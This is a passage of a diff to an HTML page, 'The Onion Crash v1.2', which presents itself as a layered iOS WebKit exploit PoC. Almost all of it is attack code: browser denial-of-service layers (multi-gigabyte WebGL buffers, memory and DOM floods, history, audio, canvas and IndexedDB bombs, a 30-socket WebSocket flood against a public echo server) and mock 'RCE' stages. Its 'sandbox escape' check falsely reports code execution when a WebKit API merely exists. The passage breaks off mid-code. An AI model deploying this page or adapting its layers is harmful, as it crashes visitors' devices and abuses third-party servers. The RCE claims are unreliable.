@@ -3,32 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>The Onion Crash v1.1 — iOS WebKit Layered Exploit PoC</title>
+    <title>The Onion Crash v1.2 — Layered WebKit Exploit PoC</title>
     <style>
         :root {
-            --neon-cyan: #00ffff;
-            --neon-magenta: #ff00ff;
-            --neon-red: #ff3333;
-            --bg-dark: #000011;
+            --cyan: #00ffff;
+            --magenta: #ff00ff;
+            --red: #ff3333;
+            --bg: #020010;
+            --card-bg: rgba(0,0,40,0.75);
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: var(--bg-dark);
+            background: var(--bg);
             font-family: 'Courier New', monospace;
-            display: flex; align-items: center; justify-content: center;
-            height: 100vh; overflow: hidden; position: relative;
-            user-select: none; -webkit-user-select: none;
-            touch-action: manipulation; color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+            color: #fff;
         }
         .bg-grid {
             position: fixed; top:0; left:0; width:100%; height:100%;
             background-image:
-                linear-gradient(rgba(0,255,255,0.08) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0,255,255,0.08) 1px, transparent 1px);
-            background-size: 20px 20px; z-index: 0; pointer-events: none;
+                linear-gradient(rgba(0,255,255,0.07) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,255,0.07) 1px, transparent 1px);
+            background-size: 20px 20px;
+            z-index: 0; pointer-events: none;
             animation: gridFlicker 3s infinite alternate;
         }
-        @keyframes gridFlicker { 0%{opacity:0.3;} 100%{opacity:0.6;} }
+        @keyframes gridFlicker {
+            0% { opacity: 0.3; } 100% { opacity: 0.6; }
+        }
         .tint-overlay {
             position: fixed; top:0; left:0; width:100%; height:100%;
             background: black; z-index: 9999; opacity:0;
@@ -36,66 +46,74 @@
         }
         .tint-overlay.active { opacity: 0.85; }
         .container {
-            position: relative; z-index: 10; width: 90%; max-width: 520px;
-            background: rgba(0,0,30,0.75); backdrop-filter: blur(15px);
-            border: 1px solid rgba(0,255,255,0.25); border-radius: 16px;
-            padding: 25px; text-align: center;
-            box-shadow: 0 0 40px rgba(0,255,255,0.2), inset 0 0 20px rgba(0,255,255,0.05);
+            position: relative; z-index: 10;
+            width: 90%; max-width: 550px;
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0,255,255,0.25);
+            border-radius: 18px;
+            padding: 25px 20px; text-align: center;
+            box-shadow: 0 0 40px rgba(0,255,255,0.2), inset 0 0 25px rgba(0,255,255,0.05);
             animation: containerPulse 2s ease-in-out infinite alternate;
         }
         @keyframes containerPulse {
-            from { box-shadow:0 0 30px rgba(0,255,255,0.2); }
-            to { box-shadow:0 0 60px rgba(255,0,255,0.4); }
+            from { box-shadow: 0 0 30px rgba(0,255,255,0.2); }
+            to { box-shadow: 0 0 65px rgba(255,0,255,0.4); }
         }
         h1 {
-            font-size: clamp(2rem, 7vw, 3rem); color: var(--neon-cyan);
-            text-shadow: 0 0 10px var(--neon-cyan), 0 0 30px var(--neon-cyan);
+            font-size: clamp(2rem, 8vw, 3.2rem);
+            color: var(--cyan);
+            text-shadow: 0 0 12px var(--cyan), 0 0 35px var(--cyan);
             animation: flicker 2s infinite alternate;
         }
         @keyframes flicker {
-            0%,19%,21%,23%,25%,54%,56%,100% { opacity:1; text-shadow:0 0 15px var(--neon-cyan), 0 0 40px var(--neon-cyan); }
-            20%,24%,55% { opacity:0.7; text-shadow:0 0 8px var(--neon-cyan), 0 0 20px var(--neon-cyan); }
+            0%,19%,21%,23%,25%,54%,56%,100% { opacity:1; text-shadow: 0 0 16px var(--cyan), 0 0 45px var(--cyan); }
+            20%,24%,55% { opacity:0.7; text-shadow: 0 0 8px var(--cyan), 0 0 22px var(--cyan); }
         }
-        h2 { font-size:1rem; color:var(--neon-magenta); text-shadow:0 0 8px var(--neon-magenta); letter-spacing:2px; margin:5px 0 15px; }
-        .version { font-size:0.7rem; color:#888; margin-top:-10px; margin-bottom:10px; }
+        h2 {
+            font-size: 1rem; color: var(--magenta);
+            text-shadow: 0 0 8px var(--magenta);
+            letter-spacing: 3px; margin: 5px 0 15px;
+        }
         .disclaimer {
-            background: rgba(255,0,0,0.1); border:1px solid var(--neon-red);
-            border-radius:8px; padding:12px; margin:20px 0;
-            color:#ffaaaa; font-size:0.8rem; line-height:1.5;
-            text-shadow:0 0 4px red; text-align:left;
+            background: rgba(255,0,0,0.1);
+            border: 1px solid var(--red);
+            border-radius: 8px; padding: 12px; margin: 20px 0;
+            color: #ffaaaa; font-size: 0.75rem; line-height: 1.5;
+            text-shadow: 0 0 4px red; text-align: left;
         }
-        .disclaimer h3 { color:var(--neon-red); text-align:center; margin-bottom:8px; }
+        .disclaimer h3 { color: var(--red); text-align: center; margin-bottom: 8px; }
         .btn {
-            background:transparent; border:2px solid var(--neon-magenta);
-            color:var(--neon-magenta); font-family:inherit;
-            font-size:1.5rem; font-weight:bold; padding:12px 30px;
-            border-radius:30px; cursor:pointer; letter-spacing:2px;
-            text-transform:uppercase; text-shadow:0 0 8px var(--neon-magenta);
-            box-shadow:0 0 15px rgba(255,0,255,0.4); transition:all 0.3s;
-            margin:10px 0; position:relative; overflow:hidden;
+            background: transparent; border: 2px solid var(--magenta);
+            color: var(--magenta); font-family: inherit;
+            font-size: 1.5rem; font-weight: bold; padding: 12px 30px;
+            border-radius: 30px; cursor: pointer; letter-spacing: 2px;
+            text-transform: uppercase; text-shadow: 0 0 8px var(--magenta);
+            box-shadow: 0 0 15px rgba(255,0,255,0.4); transition: all 0.3s;
+            margin: 10px 0; position: relative; overflow: hidden;
         }
         .btn:hover, .btn:active {
-            background:rgba(255,0,255,0.15); border-color:white;
-            color:white; box-shadow:0 0 30px var(--neon-magenta), 0 0 60px var(--neon-magenta);
+            background: rgba(255,0,255,0.15); border-color: white;
+            color: white; box-shadow: 0 0 30px var(--magenta), 0 0 60px var(--magenta);
         }
         .btn:disabled { opacity:0.5; pointer-events:none; }
-        .btn-small {
-            font-size:0.8rem; padding:5px 15px; margin:5px;
-        }
+        .confirm-box { display: none; margin-top: 15px; }
         .history {
-            background:rgba(0,255,255,0.05); border:1px solid rgba(0,255,255,0.3);
-            border-radius:8px; padding:10px; margin-top:20px;
-            font-size:0.7rem; max-height:160px; overflow-y:auto;
-            text-align:left; color:#ccc; display:none;
+            background: rgba(0,255,255,0.04);
+            border: 1px solid rgba(0,255,255,0.3);
+            border-radius: 8px; padding: 10px; margin-top: 25px;
+            font-size: 0.7rem; max-height: 160px; overflow-y: auto;
+            text-align: left; color: #ccc; display: none;
         }
-        .history h4 { color:var(--neon-cyan); margin-bottom:5px; }
-        .log-entry { border-bottom:1px dashed #333; padding:3px 0; }
+        .history h4 { color: var(--cyan); margin-bottom:6px; }
+        .log-entry { border-bottom:1px dashed #333; padding:4px 0; }
         .status-running { color: orange; }
         .status-completed { color: lime; }
+        .status-error { color: yellow; }
         .status-crashed { color: red; font-weight:bold; }
-        .status-special { color: gold; font-weight:bold; font-size:1.1em; }
+        .status-special { color: gold; font-weight:bold; }
         #statusText { min-height:24px; margin:10px 0; color:#aaa; text-shadow:0 0 5px white; }
-        #layerProgress { margin:10px 0; font-size:0.8rem; color:#aaa; }
+        #layerProgress { font-size:0.8rem; color:#aaa; margin:8px 0; }
     </style>
 </head>
 <body>
@@ -104,30 +122,33 @@
 
     <div class="container">
         <h1>The Onion Crash</h1>
-        <h2>Layered WebKit Exploit PoC</h2>
-        <div class="version">v1.1 — луковица с детектором падения (улучшенная)</div>
+        <h2>Layered WebKit Exploit PoC v1.2</h2>
 
         <div class="disclaimer">
             <h3>⚠️ КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ</h3>
-            <p><strong>Мы не несём ответственности</strong> за состояние устройства, потерю данных, респринг, перезагрузку или kernel panic.</p>
-            <p>Нажав кнопку «Run Exploit», вы запустите каскад из <strong>30+ эксплойт-техник</strong>, включая многослойные попытки RCE и мощный DoS.</p>
+            <p><strong>Мы не несём ответственности</strong> за состояние вашего устройства, потерю данных, респринг, перезагрузку (reboot) или kernel panic.</p>
+            <p>Нажав кнопку «Run Exploit», вы запустите каскад из <strong>30+ эксплойт-техник</strong>, сгруппированных по вероятности краша. Возможна полная перезагрузка устройства.</p>
             <p>Используйте <strong>только на тестовом устройстве</strong>. Это исследовательский инструмент.</p>
         </div>
 
         <button class="btn" id="runBtn">▶ Run Exploit</button>
-        <button class="btn btn-small" id="clearHistoryBtn">🧹 Очистить историю</button>
+        <div class="confirm-box" id="confirmBox">
+            <p style="color:#ffaa00; margin:10px 0;">Вы точно хотите продолжить?<br>Устройство может перезагрузиться.</p>
+            <button class="btn" id="confirmBtn" style="font-size:1.2rem; padding:8px 25px;">Да, я понимаю риск</button>
+        </div>
+
         <div id="statusText"></div>
         <div id="layerProgress"></div>
 
         <div class="history" id="historyBox">
-            <h4>📋 История сессий (последние 3)</h4>
+            <h4>📋 История сессий (localStorage)</h4>
             <div id="historyContent"></div>
         </div>
     </div>
 
     <script>
-        // ==================== ХРАНИЛИЩЕ ====================
-        const STORAGE_KEY = 'onion_crash_v1.1_sessions';
+        // ==================== ХРАНИЛИЩЕ И УМНЫЕ СЕССИИ ====================
+        const STORAGE_KEY = 'onion_crash_v12_sessions';
         function loadSessions() {
             try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; } catch(e) { return []; }
         }
@@ -136,31 +157,30 @@
         }
 
         let currentSession = null;
-
-        // Восстановление крашнутых сессий (только если они были прерваны)
-        function recoverCrashedSessions() {
+        // При загрузке страницы проверяем незавершённые сессии (крашнутые)
+        function processCrashedSessions() {
             const sessions = loadSessions();
             let changed = false;
             sessions.forEach(session => {
-                // Если сессия не завершена и не помечена как crashed, проверяем слои
-                if (session.status !== 'completed' && session.status !== 'crashed') {
-                    const runningLayer = session.layers.find(l => l.status === 'running');
-                    if (runningLayer) {
-                        runningLayer.status = 'crashed';
+                if (session.status === 'running') {
+                    // Ищем последний слой, который был в статусе running
+                    const lastRunningLayer = [...session.layers].reverse().find(l => l.status === 'running');
+                    if (lastRunningLayer) {
+                        lastRunningLayer.status = 'crashed';
                         session.status = 'crashed';
                         changed = true;
                     }
                 }
             });
             if (changed) saveSessions(sessions);
-            return sessions;
         }
+        processCrashedSessions();
 
-        function createSession() {
+        function createNewSession() {
             const s = {
                 id: Date.now(),
                 start: new Date().toISOString(),
-                status: 'running',
+                status: 'running', // running | completed | crashed
                 layers: []
             };
             const sessions = loadSessions();
@@ -169,18 +189,19 @@
             currentSession = s;
             return s;
         }
-
-        function addLayerToSession(layerName, status, isSpecial = false) {
+        function updateLayerInSession(layerName, status) {
             if (!currentSession) return;
             let layer = currentSession.layers.find(l => l.name === layerName);
             if (!layer) {
-                layer = { name: layerName, status: 'pending', time: new Date().toISOString(), special: isSpecial };
+                layer = { name: layerName, status: 'pending', time: new Date().toISOString() };
                 currentSession.layers.push(layer);
             }
             layer.status = status;
             layer.time = new Date().toISOString();
-            if (isSpecial) layer.special = true;
-            // Обновляем в хранилище
+            // Если слой отмечен как crashed, то вся сессия crashed
+            if (status === 'crashed') {
+                currentSession.status = 'crashed';
+            }
             const sessions = loadSessions();
             const idx = sessions.findIndex(s => s.id === currentSession.id);
             if (idx !== -1) {
@@ -188,8 +209,19 @@
                 saveSessions(sessions);
             }
         }
+        function finishSession(status = 'completed') {
+            if (currentSession) {
+                currentSession.status = status;
+                const sessions = loadSessions();
+                const idx = sessions.findIndex(s => s.id === currentSession.id);
+                if (idx !== -1) {
+                    sessions[idx] = currentSession;
+                    saveSessions(sessions);
+                }
+            }
+        }
 
-        function showHistory() {
+        function displayHistory() {
             const sessions = loadSessions();
             const box = document.getElementById('historyBox');
             if (sessions.length === 0) { box.style.display = 'none'; return; }
@@ -201,418 +233,309 @@
                 const div = document.createElement('div');
                 div.className = 'log-entry';
                 const date = new Date(s.start).toLocaleString();
-                const statusIcon = s.status === 'crashed' ? '💀 ' : '✅ ';
-                div.innerHTML = `<strong>${statusIcon}${date}</strong><br>`;
+                const statusIcon = s.status === 'crashed' ? '💀 ' : s.status === 'running' ? '⏳ ' : '✅ ';
+                div.innerHTML = `<strong>${statusIcon}${date} (${s.status})</strong><br>`;
                 s.layers.forEach(l => {
                     let cls = '';
                     if (l.status === 'running') cls = 'status-running';
                     else if (l.status === 'completed') cls = 'status-completed';
+                    else if (l.status === 'error') cls = 'status-error';
                     else if (l.status === 'crashed') cls = 'status-crashed';
-                    if (l.special) cls += ' status-special';
-                    const icon = l.special ? '⚡ ' : (l.status === 'crashed' ? '💥 ' : '');
+                    const icon = l.status === 'crashed' ? '🔥' : '';
                     div.innerHTML += `&nbsp;&nbsp;${icon}${l.name}: <span class="${cls}">${l.status}</span><br>`;
                 });
                 content.appendChild(div);
             });
         }
+        displayHistory();
 
-        // При загрузке восстанавливаем крашнутые сессии и показываем историю
-        recoverCrashedSessions();
-        showHistory();
-
-        // Очистка истории
-        document.getElementById('clearHistoryBtn').addEventListener('click', () => {
-            localStorage.removeItem(STORAGE_KEY);
-            showHistory();
-            statusText.textContent = 'История очищена.';
-        });
-
-        // ==================== UI ====================
+        // ==================== UI ЛОГИКА ====================
         const runBtn = document.getElementById('runBtn');
+        const confirmBox = document.getElementById('confirmBox');
+        const confirmBtn = document.getElementById('confirmBtn');
         const statusText = document.getElementById('statusText');
         const layerProgress = document.getElementById('layerProgress');
         const tintOverlay = document.getElementById('tintOverlay');
 
-        runBtn.addEventListener('click', async () => {
-            runBtn.disabled = true;
+        runBtn.addEventListener('click', () => {
+            confirmBox.style.display = 'block';
+            runBtn.style.display = 'none';
+        });
+
+        confirmBtn.addEventListener('click', async () => {
+            confirmBtn.disabled = true;
             tintOverlay.classList.add('active');
             statusText.textContent = 'Инициализация...';
-            createSession();
-            addLayerToSession('Session start', 'running');
+            createNewSession();
+            updateLayerInSession('Session start', 'running');
             await sleep(200);
-            statusText.textContent = 'Запуск каскада...';
-            await executeLayersOrdered();
+            statusText.textContent = 'Запуск многослойного эксплойта...';
+            await executeLayersInOrder();
         });
 
         function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
-        // ==================== СЛОИ (упорядочены по нарастанию разрушительности) ====================
-        const layers = [
-            // ---------- RCE цепочка (5 стадий) ----------
+        // ==================== ГРУППЫ СЛОЁВ ====================
+        const lowProbabilityLayers = [
             {
-                name: 'RCE Stage 1 - JIT spray & Wasm alloc',
-                severity: 'low',
+                name: 'RCE Stage 1: JIT spray + Wasm memory setup',
                 run: async () => {
                     try {
                         const code = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,7,1,3,97,100,100,0,0,10,9,1,7,0,32,0,32,1,106,11]);
                         const mod = new WebAssembly.Module(code);
-                        for (let i=0; i<150; i++) {
+                        for (let i=0;i<150;i++) {
                             const inst = new WebAssembly.Instance(mod, {});
-                            for (let j=0; j<500; j++) inst.exports.add(i, j);
+                            for (let j=0;j<300;j++) inst.exports.add(i,j);
                         }
-                        new WebAssembly.Memory({ initial: 512, maximum: 1024 });
+                        const mem = new WebAssembly.Memory({ initial: 512, maximum: 1024 });
+                        new Uint8Array(mem.buffer).fill(0x90);
                     } catch(e) {}
-                    await sleep(40);
+                    await sleep(30);
                 }
             },
             {
-                name: 'RCE Stage 2 - Type confusion spray',
-                severity: 'low',
+                name: 'RCE Stage 2: Type confusion / fake vtable',
                 run: async () => {
                     try {
-                        const arr = [];
-                        for (let i=0; i<1000; i++) arr.push({a:1});
-                        const buf = new ArrayBuffer(16);
+                        const objs = [];
+                        for (let i=0;i<500;i++) objs.push({a:1,b:2});
+                        // Пытаемся спровоцировать путаницу через ArrayBuffer
+                        const buf = new ArrayBuffer(8);
                         const f64 = new Float64Array(buf);
+                        const u32 = new Uint32Array(buf);
                         f64[0] = 1.1;
-                    } catch(e) {}
-                    await sleep(40);
-                }
-            },
-            {
-                name: 'RCE Stage 3 - Fake vtable / prototype',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        function Victim() {}
-                        Victim.prototype.foo = function() {};
-                        const v = new Victim();
-                        v.__proto__ = null; // может вызвать странное поведение
+                        u32[0] = 0x41414141;
                     } catch(e) {}
                     await sleep(30);
                 }
             },
             {
-                name: 'RCE Stage 4 - Out-of-bounds read simulation',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        const arr = new Uint8Array(100);
-                        // Создаём DataView с подозрительным смещением
-                        const view = new DataView(arr.buffer);
-                        view.getUint32(96, true); // near end
-                    } catch(e) {}
-                    await sleep(30);
-                }
-            },
-            {
-                name: 'RCE Stage 5 - Sandbox escape check',
-                severity: 'low',
+                name: 'RCE Stage 3: Sandbox escape probe',
                 run: async () => {
                     let escaped = false;
                     try {
                         if (typeof window.webkit !== 'undefined' && window.webkit.messageHandlers) escaped = true;
-                        // @ts-ignore
-                        if (window.parent !== window) escaped = true;
+                    } catch(e) {}
+                    try {
+                        if (window.resolveLocalFileSystemURL) escaped = true;
                     } catch(e) {}
                     if (escaped) {
-                        addLayerToSession('OMG!! It’s executed crashcode out of sandbox', 'completed', true);
-                    } else {
-                        addLayerToSession('RCE: sandbox intact', 'completed');
+                        updateLayerInSession('OMG!! It’s executed crashcode out of sandbox', 'completed');
+                        // не останавливаемся, продолжаем
                     }
-                    await sleep(20);
-                }
-            },
-            // ---------- Фоновый шум (легкие DoS) ----------
-            {
-                name: 'History API spam (1ms)',
-                severity: 'low',
-                run: async () => {
-                    const intv = setInterval(() => window.history.pushState(null,'','#'+Math.random()), 1);
-                    setTimeout(() => clearInterval(intv), 500);
-                    await sleep(500);
-                }
-            },
-            {
-                name: 'Console flood (5k lines)',
-                severity: 'low',
-                run: async () => {
-                    for (let i=0; i<5000; i++) console.log(i);
-                    await sleep(40);
-                }
-            },
-            {
-                name: 'Geolocation watch x10',
-                severity: 'low',
-                run: async () => {
-                    if (navigator.geolocation) {
-                        for (let i=0; i<10; i++) navigator.geolocation.watchPosition(()=>{}, ()=>{}, {timeout:100});
-                    }
-                    await sleep(80);
-                }
-            },
-            {
-                name: 'Notification request x5',
-                severity: 'low',
-                run: async () => {
-                    if ('Notification' in window) {
-                        for (let i=0; i<5; i++) Notification.requestPermission();
-                    }
-                    await sleep(80);
-                }
-            },
-            {
-                name: 'Vibration pattern bomb',
-                severity: 'low',
-                run: async () => {
-                    if (navigator.vibrate) navigator.vibrate([1,50,1,50,1,50,1,50,1,50,1,50]);
-                    await sleep(80);
-                }
-            },
-            {
-                name: 'WebSocket connect spam',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        const sockets = [];
-                        for (let i=0; i<5; i++) {
-                            const ws = new WebSocket('wss://echo.websocket.org');
-                            ws.onopen = () => ws.send(new ArrayBuffer(30000));
-                            sockets.push(ws);
-                        }
-                        setTimeout(() => sockets.forEach(s => s.close()), 400);
-                    } catch(e) {}
-                    await sleep(400);
-                }
-            },
-            // ---------- Средние DoS ----------
-            {
-                name: 'DOM overload (25k divs)',
-                severity: 'medium',
-                run: async () => {
-                    const cont = document.createElement('div');
-                    cont.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;overflow:hidden;z-index:1;';
-                    document.body.appendChild(cont);
-                    for (let i=0; i<25000; i++) {
-                        const d = document.createElement('div');
-                        d.style.cssText = `position:absolute;width:1px;height:1px;backdrop-filter:blur(${i%5}px);`;
-                        cont.appendChild(d);
-                    }
-                    await sleep(100);
-                }
-            },
-            {
-                name: 'IndexedDB flood (500 writes)',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        const req = indexedDB.open('onionDB',1);
-                        req.onupgradeneeded = e => e.target.result.createObjectStore('store',{autoIncrement:true});
-                        req.onsuccess = e => {
-                            const db = e.target.result;
-                            const tx = db.transaction('store','readwrite');
-                            for (let i=0; i<500; i++) tx.objectStore('store').put({payload: new ArrayBuffer(60000)});
-                        };
-                    } catch(e) {}
-                    await sleep(300);
-                }
-            },
-            {
-                name: 'AudioContext oscillator x50',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        const ctx = new AudioContext();
-                        for (let i=0; i<50; i++) {
-                            const osc = ctx.createOscillator();
-                            osc.frequency.value = Math.random()*20000;
-                            osc.connect(ctx.destination);
-                            osc.start();
-                            osc.stop(ctx.currentTime+0.1);
-                        }
-                        ctx.close();
-                    } catch(e) {}
-                    await sleep(200);
-                }
-            },
-            {
-                name: 'Canvas toDataURL spam (5x)',
-                severity: 'medium',
-                run: async () => {
-                    const c = document.createElement('canvas');
-                    c.width = 1500; c.height = 1500;
-                    c.getContext('2d').fillRect(0,0,1500,1500);
-                    for (let i=0; i<5; i++) { try { c.toDataURL(); } catch(e) {} }
-                    await sleep(100);
-                }
-            },
-            {
-                name: 'SVG filter chain (50 GaussianBlur)',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        const svgNS = 'http://www.w3.org/2000/svg';
-                        const svg = document.createElementNS(svgNS, 'svg');
-                        svg.setAttribute('width','1'); svg.setAttribute('height','1');
-                        let filters = '';
-                        for (let i=0; i<50; i++) filters += `<feGaussianBlur in="SourceGraphic" stdDeviation="${i}" result="blur${i}"/>`;
-                        svg.innerHTML = `<filter id="f">${filters}</filter><rect filter="url(#f)" width="1" height="1"/>`;
-                        document.body.appendChild(svg);
-                        setTimeout(() => svg.remove(), 250);
-                    } catch(e) {}
-                    await sleep(250);
-                }
-            },
-            {
-                name: 'Broadcast Channel spam',
-                severity: 'medium',
-                run: async () => {
-                    try {
-                        const channels = [];
-                        for (let i=0; i<20; i++) {
-                            const ch = new BroadcastChannel('crash'+i);
-                            ch.postMessage(new ArrayBuffer(10000));
-                            channels.push(ch);
-                        }
-                        setTimeout(() => channels.forEach(ch => ch.close()), 200);
-                    } catch(e) {}
-                    await sleep(200);
-                }
-            },
-            // ---------- Тяжёлые DoS ----------
-            {
-                name: 'Memory flood (300 ArrayBuffers)',
-                severity: 'high',
-                run: async () => {
-                    const chunks = [];
-                    try {
-                        for (let i=0; i<300; i++) {
-                            const sz = 6*1024*1024 + Math.floor(Math.random()*2*1024*1024);
-                            const b = new ArrayBuffer(sz);
-                            new Uint8Array(b).fill(0x41);
-                            chunks.push(b);
-                        }
-                    } catch(e) {}
-                    await sleep(150);
-                }
-            },
-            {
-                name: 'CSS animation storm (250 rotating blurs)',
-                severity: 'high',
-                run: async () => {
-                    const style = document.createElement('style');
-                    style.textContent = `@keyframes rot{from{transform:rotate(0deg)}to{transform:rotate(360deg)}} .ab{position:fixed;width:12px;height:12px;backdrop-filter:blur(18px);animation:rot 0.3s linear infinite;}`;
-                    document.head.appendChild(style);
-                    for (let i=0; i<250; i++) {
-                        const d = document.createElement('div');
-                        d.className = 'ab';
-                        d.style.left = Math.random()*100+'%';
-                        d.style.top = Math.random()*100+'%';
-                        document.body.appendChild(d);
-                    }
-                    await sleep(800);
-                }
-            },
-            {
-                name: 'WebGL buffer overflow (extreme)',
-                severity: 'high',
-                run: async () => {
-                    try {
-                        const c = document.createElement('canvas');
-                        c.width = 1; c.height = 1;
-                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                        if (gl) {
-                            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(250000000), gl.DYNAMIC_DRAW);
-                        }
-                    } catch(e) {}
-                    await sleep(60);
-                }
-            },
-            {
-                name: 'rAF stress (2000 frames)',
-                severity: 'high',
-                run: async () => {
-                    let cnt = 0;
-                    function r() {
-                        cnt++;
-                        let s = 0;
-                        for (let i=0; i<5000; i++) s += Math.sqrt(i);
-                        if (cnt < 2000) requestAnimationFrame(r);
-                    }
-                    for (let i=0; i<4; i++) requestAnimationFrame(r);
-                    await sleep(1000);
-                }
-            },
-            {
-                name: 'SharedArrayBuffer + Worker (if available)',
-                severity: 'high',
-                run: async () => {
-                    try {
-                        if (typeof SharedArrayBuffer !== 'undefined') {
-                            const sab = new SharedArrayBuffer(1024*1024*10);
-                            const w = new Worker('data:text/javascript,onmessage=function(e){while(1){}}');
-                            w.postMessage(sab);
-                            setTimeout(() => w.terminate(), 500);
-                        }
-                    } catch(e) {}
-                    await sleep(500);
-                }
-            },
-            // ---------- ФИНАЛЬНЫЙ БОСС (самый опасный) ----------
-            {
-                name: '💣 Doomsday blur (1800 layers) + GPU overload',
-                severity: 'critical',
-                run: async () => {
-                    const attackDiv = document.createElement('div');
-                    attackDiv.id = 'final-attack';
-                    attackDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;pointer-events:none;';
-                    document.body.appendChild(attackDiv);
-                    for (let i=0; i<1800; i++) {
-                        const d = document.createElement('div');
-                        const blurPx = 140 + Math.sin(i)*30;
-                        d.style.cssText = `
-                            position: fixed; top:0; left:0; width:100vw; height:100vh;
-                            backdrop-filter: blur(${blurPx}px) brightness(1.4) contrast(1.5);
-                            -webkit-backdrop-filter: blur(${blurPx}px) brightness(1.4) contrast(1.5);
-                            opacity: 0.95;
-                            transform: translate3d(${i*0.5}px, ${i*0.4}px, ${i*0.7}px) scale(${1 + i*0.0005});
-                            z-index: ${9999 + i};
-                            animation: final-spin ${2.5 + i*0.003}s linear infinite;
-                        `;
-                        attackDiv.appendChild(d);
-                    }
-                    const finalStyle = document.createElement('style');
-                    finalStyle.textContent = `@keyframes final-spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }`;
-                    document.head.appendChild(finalStyle);
-                    await sleep(4000); // ждём, пока устройство сдастся
+                    await sleep(30);
                 }
             }
         ];
 
-        async function executeLayersOrdered() {
-            layerProgress.textContent = `0 / ${layers.length}`;
-            for (let i=0; i<layers.length; i++) {
-                const layer = layers[i];
-                addLayerToSession(layer.name, 'running');
-                statusText.textContent = `[${i+1}/${layers.length}] ${layer.name}`;
-                layerProgress.textContent = `${i+1} / ${layers.length}`;
+        const mediumProbabilityLayers = [
+            { name: 'WebGL buffer overflow (2GB)', run: async () => {
+                try {
+                    const c = document.createElement('canvas'); c.width=1;c.height=1;
+                    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                    if(gl) {
+                        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(500000000), gl.DYNAMIC_DRAW);
+                    }
+                } catch(e) {} await sleep(30);
+            }},
+            { name: 'Memory flood (ArrayBuffers)', run: async () => {
+                const chunks = [];
+                try {
+                    for(let i=0;i<200;i++) {
+                        const sz = 5*1024*1024 + Math.floor(Math.random()*3*1024*1024);
+                        const b = new ArrayBuffer(sz);
+                        new Uint8Array(b).fill(0x42);
+                        chunks.push(b);
+                    }
+                } catch(e) {} await sleep(40);
+            }},
+            { name: 'DOM node overload (40k divs with blur)', run: async () => {
+                const cont = document.createElement('div');
+                cont.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;overflow:hidden;z-index:1;';
+                document.body.appendChild(cont);
+                for(let i=0;i<40000;i++) {
+                    const d = document.createElement('div');
+                    d.style.cssText = `position:absolute;width:1px;height:1px;backdrop-filter:blur(${i%6}px);`;
+                    cont.appendChild(d);
+                }
+                await sleep(80);
+            }},
+            { name: 'History API spam', run: async () => {
+                const intv = setInterval(() => window.history.pushState(null,'','#'+Math.random()), 1);
+                await sleep(1000);
+                clearInterval(intv);
+                await sleep(50);
+            }},
+            { name: 'CSS animation storm (300 elements)', run: async () => {
+                const s = document.createElement('style');
+                s.textContent = '@keyframes rota{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}.an{position:fixed;width:12px;height:12px;backdrop-filter:blur(18px);animation:rota 0.3s linear infinite;}';
+                document.head.appendChild(s);
+                for(let i=0;i<300;i++) {
+                    const d = document.createElement('div'); d.className='an';
+                    d.style.left=Math.random()*100+'%'; d.style.top=Math.random()*100+'%';
+                    document.body.appendChild(d);
+                }
+                await sleep(500);
+            }},
+            { name: 'rAF stress (1500 frames)', run: async () => {
+                let cnt=0;
+                function r() { cnt++; let s=0; for(let i=0;i<6000;i++) s+=Math.sqrt(i); if(cnt<1500) requestAnimationFrame(r); }
+                for(let i=0;i<6;i++) requestAnimationFrame(r);
+                await sleep(800);
+            }},
+            { name: 'AudioContext oscillator bomb', run: async () => {
+                try {
+                    const ctx = new AudioContext();
+                    for(let i=0;i<150;i++) {
+                        const o = ctx.createOscillator(); o.frequency.value=Math.random()*20000;
+                        o.connect(ctx.destination); o.start(); o.stop(ctx.currentTime+0.1);
+                    }
+                    ctx.close();
+                } catch(e) {} await sleep(200);
+            }},
+            { name: 'WebSocket flood', run: async () => {
+                try {
+                    const sockets = [];
+                    for(let i=0;i<30;i++) {
+                        const ws = new WebSocket('wss://echo.websocket.org');
+                        ws.onopen = () => ws.send(new ArrayBuffer(80000));
+                        sockets.push(ws);
+                    }
+                    await sleep(400);
+                    sockets.forEach(s => s.close());
+                } catch(e) {} await sleep(100);
+            }},
+            { name: 'IndexedDB massive writes', run: async () => {
+                try {
+                    const req = indexedDB.open('db',1); req.onupgradeneeded=e=>e.target.result.createObjectStore('s',{autoIncrement:true});
+                    req.onsuccess=e=>{ const tx=e.target.result.transaction('s','readwrite'); for(let i=0;i<800;i++) tx.objectStore('s').put({d:new ArrayBuffer(50000)}); };
+                } catch(e) {} await sleep(400);
+            }},
+            { name: 'Canvas toDataURL bomb', run: async () => {
+                try {
+                    const c = document.createElement('canvas'); c.width=3000; c.height=3000;
+                    c.getContext('2d').fillRect(0,0,3000,3000);
+                    for(let i=0;i<10;i++) c.toDataURL();
+                } catch(e) {} await sleep(100);
+            }},
+            { name: 'SVG filter chain overload', run: async () => {
+                try {
+                    const svg = document.createElementNS('http://www.w3.org/2000/svg','svg');
